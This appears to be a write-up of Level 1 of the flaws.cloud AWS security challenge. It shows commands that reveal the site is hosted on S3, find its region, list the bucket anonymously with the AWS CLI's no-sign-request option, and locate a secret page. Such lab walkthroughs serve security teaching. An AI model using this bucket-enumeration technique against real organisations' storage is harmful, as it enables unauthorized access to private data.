# [Level 1](http://flaws.cloud/)

* Notice the site is hosted on S3:

```bash
$ curl -I http://flaws.cloud
HTTP/1.1 200 OK
x-amz-id-2: legjOf3wdebN8gGr0CdlJuoia2lq3q5lBmOBgzBULVBoFncutdssl4YnLIZK6pRvFBBaOjC2ZT0=
x-amz-request-id: F361D07A659E9096
Date: Tue, 12 May 2020 00:21:51 GMT
Last-Modified: Tue, 10 Jul 2018 16:47:16 GMT
ETag: "ddd133aef0f381cf0440d5f09648791d"
Content-Type: text/html
Content-Length: 3082
Server: AmazonS3
```

or

```bash
$ dig +nocmd flaws.cloud any +multiline +noall +answer
flaws.cloud.    30 IN A  52.218.229.10
# ...

# Visit IP (52.218.229.10) and notice redirect to:
# https://aws.amazon.com/s3/
```

* Find region info:

```bash
$ nslookup 52.218.229.10
Server:   192.168.208.1
Address:  192.168.208.1#53

Non-authoritative answer:
10.229.218.52.in-addr.arpa  name = s3-website-us-west-2.amazonaws.com.
```

* Try listing contents of bucket:

```bash
$ aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
2017-03-13 20:00:38       2575 hint1.html
2017-03-02 20:05:17       1707 hint2.html
2017-03-02 20:05:11       1101 hint3.html
2018-07-10 09:47:16       3082 index.html
2018-07-10 09:47:16      15979 logo.png
2017-02-26 17:59:28         46 robots.txt
2017-02-26 17:59:30       1051 secret-dd02c7c.html
```

* Visit http://flaws.cloud/secret-dd02c7c.html
